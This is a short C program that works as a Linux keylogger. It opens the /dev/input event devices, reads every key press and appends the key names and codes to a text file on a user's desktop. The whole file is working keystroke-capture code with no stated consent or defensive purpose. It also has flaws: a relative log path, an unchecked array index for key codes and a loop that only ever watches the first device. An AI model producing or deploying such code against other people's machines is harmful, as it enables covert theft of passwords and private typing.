#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <string.h>
#include <dirent.h>

#define LOG_PATH "home/jose/desktop/keylogging.txt"
#define INPUT_DIR "/dev/input/"
#define DEVICE_PATH_SIZE 512

const char *keymap[256] = {
    [0] = "reserved", [1] = "esc", [2] = "1", [3] = "2", [4] = "3",
    [5] = "4", [6] = "5", [7] = "6", [8] = "7", [9] = "8",
    [10] = "9", [11] = "0", [12] = "-", [13] = "=", [14] = "backspace",
    [15] = "tab", [16] = "q", [17] = "w", [18] = "e", [19] = "r",
    [20] = "t", [21] = "y", [22] = "u", [23] = "i", [24] = "o",
    [25] = "p", [26] = "[", [27] = "]", [28] = "enter", [29] = "ctrl",
    [30] = "a", [31] = "s", [32] = "d", [33] = "f", [34] = "g",
    [35] = "h", [36] = "j", [37] = "k", [38] = "l", [39] = ";",
    [40] = "'", [41] = "`", [42] = "lshift", [43] = "\\", [44] = "z",
    [45] = "x", [46] = "c", [47] = "v", [48] = "b", [49] = "n",
    [50] = "m", [51] = ",", [52] = ".", [53] = "/", [54] = "rshift",
    [55] = "kpasterisk", [56] = "lalt", [57] = "space", [58] = "capslock",
};

void log_key(int code) {
    FILE *file = fopen(LOG_PATH, "a");
    if (file == NULL) {
        perror("no se pudo abrir o crear el archivo de registro");
        exit(EXIT_FAILURE);
    }

    const char *key_str = keymap[code];
    if (key_str) {
        fprintf(file, "key: %s (code: %d)\n", key_str, code);
    } else {
        fprintf(file, "keycode desconocido: %d\n", code);
    }
    fclose(file);
}

void detect_and_log_keys(const char *device_path) {
    struct input_event event;
    int device = open(device_path, O_RDONLY);
    if (device == -1) {
        perror("no se pudo abrir el dispositivo de entrada");
        exit(EXIT_FAILURE);
    }

    while (1) {
        if (read(device, &event, sizeof(event)) == sizeof(event)) {
            if (event.type == EV_KEY && event.value == 1) {
                log_key(event.code);
            }
        }
    }

    close(device);
}

int main() {
    struct dirent *entry;
    DIR *dp = opendir(INPUT_DIR);

    if (dp == NULL) {
        perror("no se pudo abrir el directorio de dispositivos de entrada");
        exit(EXIT_FAILURE);
    }

    char device_path[DEVICE_PATH_SIZE];
    while ((entry = readdir(dp))) {
        if (strstr(entry->d_name, "event")) {
            snprintf(device_path, sizeof(device_path), "%s%s", INPUT_DIR, entry->d_name);
            detect_and_log_keys(device_path);
        }
    }

    closedir(dp);
    return 0;
}

